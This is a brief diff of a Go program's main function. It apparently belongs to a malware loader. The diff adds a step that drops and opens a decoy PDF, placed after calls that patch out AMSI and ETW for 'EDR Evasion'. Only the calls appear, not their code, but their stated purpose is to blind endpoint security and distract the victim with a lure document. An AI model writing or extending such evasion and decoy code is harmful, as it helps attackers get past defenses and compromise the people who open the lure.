@@ -43,9 +43,12 @@ func normalInit() {
 func main() {
 	normalInit()
 
-	// ===== EDR 绕过：AMSI + ETW Patch（必须在最早阶段执行）=====
+	// ===== EDR Evasion: AMSI + ETW Patch =====
 	evasion.BypassAMSI()
 	evasion.BypassETW()
+
+	// ===== Drop & open decoy PDF (if embedded) =====
+	evasion.DropAndOpenPDF()
 
 	evasion.InitLegitimateAPIs()
 
